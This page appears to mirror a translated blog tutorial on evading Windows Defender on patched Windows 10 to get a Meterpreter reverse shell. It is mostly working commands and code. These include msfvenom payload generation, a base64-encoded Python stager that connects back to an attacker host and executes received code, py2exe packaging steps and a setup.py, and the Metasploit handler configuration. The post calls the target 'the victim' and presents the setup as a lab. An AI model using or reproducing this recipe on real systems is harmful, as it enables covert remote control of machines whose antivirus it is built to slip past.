<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Bypassing Windows Defender cheap and cheerful: meterpreter session through python</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Hello. Today we consider the option of running the meterpreter session on a Windows 10 machine with the latest patches (including Windows Defender). A...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Bypassing Windows Defender cheap and cheerful: meterpreter session through python</h1><div class="post__text post__text-html js-mediator-article"><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/df8/383/7a0/df83837a03a562122e2ce8687cd6ecd7.jpg" alt="image"></div><br>  Hello.  Today we consider the option of running the meterpreter session on a Windows 10 machine with the latest patches (including Windows Defender).  And we will also bypass antivirus software.  Meterpreter - advanced multi-functional stuffing (payload, load), which can be dynamically expanded at run time.  Under normal conditions, this provides you with a basic shell and allows you to add new features to it as needed. <br>  We will do this with the help of Python, and see how antivirus tools behave. <br><br>  Anticipating the question "Do we need Python on the victim's machine to run ex?", I will answer right away - no, not needed, everything is already inside. <br><a name="habracut"></a><br>  In this article we will use: <br><br><ul><li>  Windows 10 with Windows Defender turned on with updated databases (victim's computer 192.168.1.113); </li><li>  Kali linux for using metasploit and msfvenom (192.168.1.126); </li><li>  Windows 10 for building a binary (in our laboratory coincides with the victim's computer) with installed ones; </li><li>  <a href="https://www.python.org/">Python</a> (3, but also for 2 we'll see); </li><li>  <a href="http://www.py2exe.org/">py2exe</a> . </li></ul><br>  To begin with, we denote the problem: we will create an exe file with a standard load, copy it onto the victim's machine and see what it will lead to. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <pre><code class="bash hljs">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.126 LPORT=9001 -f exe &gt; hunt.exe</code> </pre> <br>  We get a warning from our old friend, Windows Defender, whom we all love so much. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/651/959/ced/651959ced30f3652b58d12b1913e783a.jpg" alt="image"></div><br>  If we ask VirusTotal, he will say the following: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/ed0/fb3/318/ed0fb33185ab387fede531f388e34746.jpg" alt="image"><br><br>  Let's run Python and do something for which we are all gathered here. <br><br>  Python / meterpreter / reverse_tcp is a unique cross-platform payload Metasploit Framework that allows you to remotely manage a compromised computer.  No need to think about which platform to choose, it will work on any, but in this case we will make an executable file from it under Windows. <br><br>  First, install the py2exe package, which allows you to make a Windows executable from the Python script. <br><br>  We will have Python 3.4 (all that is higher - does not support py2exe). <br><br><pre> <code class="bash hljs">py -3.4 ‚Äìm pip install py2exe</code> </pre> <br>  or <br><br><pre> <code class="bash hljs">pip install py2exe</code> </pre> <br>  Next, create a "raw" Python code with the extension .py <br><br><pre> <code class="bash hljs">msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.126 LPORT=9001 -f raw &gt; hunt.py</code> </pre> <br>  Also in the output of msfvenom we need to add a getpass import, which it forgets to do itself.  As a result, it should turn out like this: <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> getpass,base64,sys;exec(base64.b64decode({<span class="hljs-number"><span class="hljs-number">2</span></span>:str,<span class="hljs-number"><span class="hljs-number">3</span></span>:<span class="hljs-keyword"><span class="hljs-keyword">lambda</span></span> b:bytes(b,<span class="hljs-string"><span class="hljs-string">'UTF-8'</span></span>)}[sys.version_info[<span class="hljs-number"><span class="hljs-number">0</span></span>]](<span class="hljs-string"><span class="hljs-string">'aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE5Mi4xNjguMS4xMjYnLDkwMDEpKQoJCWJyZWFrCglleGNlcHQ6CgkJdGltZS5zbGVlcCg1KQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KGwpCndoaWxlIGxlbihkKTxsOgoJZCs9cy5yZWN2KGwtbGVuKGQpKQpleGVjKGQseydzJzpzfSkK'</span></span>)))</code> </pre> <br>  Now we are ready to create a binary. <br><br><pre> <code class="bash hljs">python34 -m py2exe.build_exe hunt.py --bundle-files 0</code> </pre> <br>  Should get the following: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/ae8/c52/781/ae8c52781002ce564954ee1adf134eda.jpg" alt="image"><br><br>  Let's turn to VirusTotal again: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/7d0/0e1/847/7d00e18478218cd8063539f57f255ca8.jpg" alt="image"><br><br>  Already better, now let's check it in action - after copying to the victim's machine, we manage without alerts. <br><br>  In parallel, we will run our msf and handler for python by running sequentially the commands: <br><br><pre> <code class="bash hljs">msfconsole use exploit/multi/handler <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> PAYLOAD python/meterpreter/reverse_tcp <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> lhost 192.168.1.126 <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> lport 9001 run</code> </pre><br><img src="https://habrastorage.org/getpro/habr/post_images/946/ebb/7b9/946ebb7b960829af02e00edb39eac463.jpg" alt="image"><br><br>  Go ahead and make sure the session works correctly. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/ace/da5/03e/aceda503e1219ae380c3e63a84345453.jpg" alt="image"><br><br>  Thus, the session started and Windows Defender did not work, which is what we wanted. <br><br>  At the same time, let's consider what to do if you have Python version 2. <br><br><ol><li>  <a href="https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/py2exe-0.6.9.win32-py2.7.exe/download">Swing py2exe</a> for python 2 </li><li>  We generate payload with the .py extension </li><li>  Create a setup.py file and write the following there: <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> distutils.core <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> setup <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> py2exe setup( name = <span class="hljs-string"><span class="hljs-string">'Meter'</span></span>, description = <span class="hljs-string"><span class="hljs-string">'Python-based App'</span></span>, version = <span class="hljs-string"><span class="hljs-string">'1.0'</span></span>, console=[<span class="hljs-string"><span class="hljs-string">'hunt.py'</span></span>], options = {<span class="hljs-string"><span class="hljs-string">'py2exe'</span></span>: {<span class="hljs-string"><span class="hljs-string">'bundle_files'</span></span>: <span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-string"><span class="hljs-string">'packages'</span></span>:<span class="hljs-string"><span class="hljs-string">'ctypes'</span></span>,<span class="hljs-string"><span class="hljs-string">'includes'</span></span>: <span class="hljs-string"><span class="hljs-string">'base64,sys,socket,struct,time,code,platform,getpass,shutil'</span></span>,}}, zipfile = <span class="hljs-keyword"><span class="hljs-keyword">None</span></span>, )</code> </pre> </li><li><pre> <code class="bash hljs">python.exe .\setup.py py2exe</code> </pre> </li></ol><br><br>  It should all be the same. <br><br>  As a result, I note that the python meterpreter shell is inferior in functionality to the more familiar windows meterpreter.  For example, you will not be able to migrate to the process or use commands like getsystem, but still this is a real alternative: get a session to work with msf (routing and portfwd at least) and then work inside the network. </div><p>Source: <a href="https://habr.com/ru/post/459168/">https://habr.com/ru/post/459168/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../459154/index.html">Network for small businesses on Cisco equipment. Part 1</a></li>
<li><a href="../459156/index.html">VNIITE planet of the whole: how in the USSR the system of ‚Äúsmart home‚Äù was invented</a></li>
<li><a href="../459158/index.html">How Artifact was Valve's biggest failure</a></li>
<li><a href="../459162/index.html">"To win the championships, the team must breathe in unison." Interview with Moscow Workshops ICPC coach</a></li>
<li><a href="../459166/index.html">What are you, a closure in javascript?</a></li>
<li><a href="../459172/index.html">Top 13 Scala libraries for data analysis</a></li>
<li><a href="../459174/index.html">Rx Event Source Reference</a></li>
<li><a href="../459176/index.html">Stable high voltage source to power the PMT</a></li>
<li><a href="../459180/index.html">TheOutloud - voice and share your favorite articles and stories. Part 2</a></li>
<li><a href="../459182/index.html">GitLab: With the release of version 12.1, we stop supporting MySQL</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>